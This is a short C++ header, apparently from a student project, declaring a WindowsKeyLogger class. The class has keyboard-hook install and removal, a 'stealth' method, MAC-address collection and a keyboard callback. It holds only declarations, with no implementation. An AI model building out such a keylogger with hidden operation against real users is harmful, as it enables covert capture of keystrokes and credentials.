//
// Created by thover_j on 26/09/2017.
//

#ifndef CPP_SPIDER_KEYLOGGER_HPP
#define CPP_SPIDER_KEYLOGGER_HPP

#include	<fstream>
#include	<iostream>
#include	<string>
#include	<map>
#include	<windows.h>
#include	"IKeyLogger.hpp"

class 		WindowsKeyLogger : public IKeyLogger
{
private:
  bool 		shift;
  bool		capslock;

public:
  static std::map<DWORD, std::string> const keys;

public:
  WindowsKeyLogger();
  ~WindowsKeyLogger();
  bool 		check_upper();
  void		initHooks();
  void		stealth();
  void		unHooks();
  void		getMacAddr();
};

LRESULT CALLBACK handleKeyboard(int code, WPARAM wp, LPARAM lp);

#endif //CPP_SPIDER_KEYLOGGER_HPP
